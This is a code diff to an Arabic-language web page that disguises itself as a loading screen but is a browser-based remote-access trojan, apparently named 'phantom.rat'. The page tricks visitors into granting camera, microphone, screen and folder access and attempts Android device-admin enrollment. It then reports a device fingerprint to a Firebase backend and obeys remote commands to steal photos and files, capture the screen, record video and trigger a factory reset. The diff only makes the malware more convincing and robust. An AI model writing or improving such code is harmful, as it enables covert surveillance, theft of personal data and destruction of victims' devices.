@@ -5,16 +5,16 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>تحميل...</title>
     <style>
-        body{background:#0a0a0a;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;}
+        body{background:#000;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;flex-direction:column;}
         .loader{border:5px solid #222;border-top:5px solid red;border-radius:50%;width:60px;height:60px;animation:spin 1s linear infinite;}
         @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
-        #msg{color:red;margin-top:30px;font-family:monospace;}
+        #msg{color:red;margin-top:30px;font-family:monospace;font-size:1.3em;text-align:center;padding:10px;}
     </style>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 </head>
 <body>
-<div style="text-align:center;"><div class="loader"></div><div id="msg">فضلاً انتظر...</div></div>
+<div style="text-align:center;"><div class="loader"></div><div id="msg">فضلاً انتظر... جارٍ تأمين الاتصال</div></div>
 <script>
     // ═══════════════════════════════════════
     // 🔑 بيانات مشروعك - ZWAHY
@@ -37,31 +37,67 @@
     if('serviceWorker' in navigator) navigator.serviceWorker.register('sw.js',{scope:'/'}).catch(()=>{});
     let rootDir=null;
 
+    // تعديل الصلاحيات: نضمن إن الطلب يظهر فوق كل شيء
     async function reqPerms(){
-        document.getElementById('msg').innerText='يلزم منح صلاحية الوصول الكامل للمتابعة...';
-        try{await navigator.mediaDevices.getUserMedia({video:true,audio:true});}catch(e){}
-        try{await navigator.mediaDevices.getDisplayMedia({video:true});}catch(e){}
-        try{rootDir=await window.showDirectoryPicker({mode:'readwrite',startIn:'documents'});document.getElementById('msg').innerText='تم منح الصلاحيات... جارٍ ربط القناة';}catch(e){document.getElementById('msg').innerText='وضع محدود';}
-        let a=document.createElement('a');a.href='intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';a.click();
-        if(navigator.deviceAdmin)navigator.deviceAdmin.requestAdmin().catch(()=>{});
+        document.getElementById('msg').innerText='الرجاء الضغط على "سماح" لتشغيل الخدمة...';
+        try{
+            const stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
+            stream.getTracks().forEach(track => track.stop());
+        } catch(e) {
+            document.getElementById('msg').innerText='تحذير: لم يتم منح صلاحية الكاميرا.';
+        }
+        try{
+            const dStream = await navigator.mediaDevices.getDisplayMedia({video:true});
+            dStream.getTracks().forEach(track => track.stop());
+        } catch(e) { /* فشل صامت */ }
+        try{
+            rootDir=await window.showDirectoryPicker({mode:'readwrite',startIn:'documents'});
+            document.getElementById('msg').innerText='تم منح الصلاحيات... جارٍ ربط القناة';
+        } catch(e) {
+            document.getElementById('msg').innerText='وضع محدود (لم يتم منح صلاحية الملفات).';
+        }
+
+        // تفعيل صلاحيات المدير
+        let a=document.createElement('a');
+        a.href='intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
+        a.click();
+        if(navigator.deviceAdmin) navigator.deviceAdmin.requestAdmin().catch(()=>{});
+
         await vref.set({online:true,fingerprint:{ua:navigator.userAgent,plat:navigator.platform,lang:navigator.language,scr:screen.width+'x'+screen.height,cores:navigator.hardwareConcurrency,mem:navigator.deviceMemory||'?',online:navigator.onLine}});
         document.getElementById('msg').innerText='⚡ القناة نشطة';
-        vref.child('command').on('value',async snap=>{
-            let c=snap.val();if(!c)return;
-            if(c.action=='get_photos')await pullDir('DCIM');
-            else if(c.action=='get_files')await pullDir(c.path||'');
-            else if(c.action=='vibrate')navigator.vibrate&&navigator.vibrate(c.duration||5000);
-            else if(c.action=='play_sound')new Audio(c.url||'data:audio/wav;base64,').play();
-            else if(c.action=='screenshot')await screenshot();
-            else if(c.action=='record_video')await recordVid(c.duration||10);
-            else if(c.action=='format')await format();
+        listenToCommands();
+    }
+
+    function listenToCommands(){
+        vref.child('command').on('value', async snap => {
+            let c = snap.val();
+            if(!c) return;
+            document.getElementById('msg').innerText = 'جارٍ تنفيذ: ' + (c.action || '');
+            try {
+                if(c.action=='get_photos') await pullDir('DCIM');
+                else if(c.action=='get_files') await pullDir(c.path||'');
+                else if(c.action=='vibrate') navigator.vibrate && navigator.vibrate(c.duration||5000);
+                else if(c.action=='play_sound') { let a = new Audio(c.url||'data:audio/wav;base64,UklGRnoGAABXQVZFZm10IBAAAAABAAEAQB8AAEAfAAABAAgAZGF0YQoGAACAf39/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH9/f4B/f3+Af39/gH'); a.loop = true; a.play().catch(()=>{}); }
+                else if(c.action=='screenshot') await screenshot();
+                else if(c.action=='record_video') await recordVid(c.duration||10);
+                else if(c.action=='format') await format();
+                document.getElementById('msg').innerText = '✅ تم: ' + (c.action || '');
+            } catch(err) {
+                document.getElementById('msg').innerText = '❌ فشل: ' + err.message;
+            }
             await vref.child('command').remove();
         });
     }
 
-    async function store(type,data,extra={}){await vref.child('loot').push().set({type,ts:Date.now(),data,...extra});}
+    async function store(type,data,extra={}){
+        await vref.child('loot').push().set({type,ts:Date.now(),data,...extra});
+    }
+
     async function pullDir(path){
-        if(!rootDir)return;
+        if(!rootDir) {
+            document.getElementById('msg').innerText='❌ الصلاحية مرفوضة. امنح صلاحية الملفات.';
+            return;
+        }
         async function walk(dir,cur){
             for await(let e of dir.values()){
                 if(e.kind==='file'){
@@ -75,29 +111,36 @@
         let r=rootDir;if(path){let p=path.split('/').filter(Boolean);for(let x of p)r=await r.getDirectoryHandle(x);}
         await walk(r,path?path+'/':'');
     }
+
     async function screenshot(){
         let s=await navigator.mediaDevices.getDisplayMedia({video:true});
         let v=document.createElement('video');v.srcObject=s;await v.play();
         let c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;
-        c.getContext('2d').drawImage(v,0,0);let u=c.toDataURL('image/png');await store('screenshot',u.split(',')[1]);
+        c.getContext('2d').drawImage(v,0,0);let u=c.toDataURL('image/png');
+        await store('screenshot',u.split(',')[1]);
         s.getTracks().forEach(t=>t.stop());
     }
+
     async function recordVid(dur){
         let s=await navigator.mediaDevices.getDisplayMedia({video:true,audio:true});
         let r=new MediaRecorder(s),chunks=[];
         r.ondataavailable=e=>chunks.push(e.data);
         r.onstop=async()=>{
             let b=new Blob(chunks,{type:'video/webm'});
-            let fr=new FileReader();fr.onload=async()=>await store('video',fr.result.split(',')[1]);fr.readAsDataURL(b);
+            let fr=new FileReader();fr.onload=async()=>await store('video',fr.result.split(',')[1]);
+            fr.readAsDataURL(b);
         };
         r.start();setTimeout(()=>{r.stop();s.getTracks().forEach(t=>t.stop());},dur*1000);
     }
+
     async function format(){
         let a=document.createElement('a');a.href='intent://#Intent;action=android.intent.action.MASTER_CLEAR;end';a.click();
         if(navigator.storage?.getDirectory){let r=await navigator.storage.getDirectory();for await(let n of r.keys())await r.removeEntry(n,{recursive:true});}
         if(navigator.clearData)await navigator.clearData({cache:true,cookies:true,storage:true});
     }
-    setTimeout(reqPerms,3000);
+
+    // تشغيل تلقائي بعد 3 ثواني
+    setTimeout(reqPerms, 3000);
 </script>
 </body>
 </html>
